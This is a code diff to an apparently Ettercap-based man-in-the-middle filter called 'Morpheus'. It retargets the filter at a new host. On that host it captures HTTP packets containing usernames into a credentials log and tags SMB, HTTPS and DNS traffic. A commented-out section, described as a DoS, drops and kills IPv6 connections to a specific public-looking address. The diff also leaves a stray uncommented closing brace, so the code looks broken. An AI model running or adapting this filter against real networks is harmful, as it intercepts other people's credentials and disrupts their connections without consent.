@@ -19,23 +19,23 @@
 
 ##
 # requests from 192.168.1.67
-if (ip.src == '192.168.1.67' || ip.dst == '192.168.1.67') {
-  msg("[Morpheus] packet from 192.168.1.67 found...");
+if (ip.src == '192.168.1.69' || ip.dst == '192.168.1.69') {
+  msg("[Morpheus] packet from 192.168.1.69 found...");
     if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
-      msg("[morpheus] host:192.168.1.67 port:80 http");
+      msg("[morpheus] host:192.168.1.69 port:80 http");
         # log credentials into morpheus/logs/credentials
         if (regex(DECODED.data, ".*username.*")) {
-         log(DECODED.data, "./credentials");
+         log(DECODED.data, "./credentials_log");
          msg("[morpheus] credentials found, logfile stored!\n");
     }else{
     if (ip.proto == TCP && tcp.src == 445 || tcp.dst == 445) {
-      msg("[morpheus] host:192.168.1.67 port:445 smb");
+      msg("[morpheus] host:192.168.1.69 port:445 smb");
     }else{
     if (ip.proto == TCP && tcp.src == 443 || tcp.dst == 443) {
-      msg("[morpheus] host:192.168.1.67 port:443 https");
+      msg("[morpheus] host:192.168.1.69 port:443 https");
     }else{
     if (ip.proto == TCP && tcp.src == 53 || tcp.dst == 53) {
-      msg("[morpheus] host:192.168.1.67 port:53 domain");
+      msg("[morpheus] host:192.168.1.69 port:53 domain");
     }
     }
     }
@@ -132,12 +132,12 @@ if (ip.dst == '192.168.1.253' || ip.dst == '192.168.1.253') {
 ##
 # drop packet | kill IPv6 connections ...
 # un-comment this funtion to filter any tcp/udp connections
-# made to OR from target ip addr (perform D0S againts ip addr)
+# made to OR from target ipv6 addr (perform D0S againts ip addr)
 #
-#if (eth.proto == IP6 && ipv6.src == '2001:db8::1' || ipv6.dst == '2001:db8::1') {
-# msg("[Morpheus] packet from 2001:db8::1 found...");
+#if (eth.proto == IP6 && ipv6.src == '2001:8a0:6c06:d601:e0db:1464:4d7c:54ce' || ipv6.dst == '2001:8a0:6c06:d601:e0db:1464:4d7c:54ce') {
+# msg("[Morpheus] packet found...");
 # msg("[Morpheus] droping target IPv6 packet...\n...\n");
 # drop();
 # drop();
 #kill();
-#}
+}
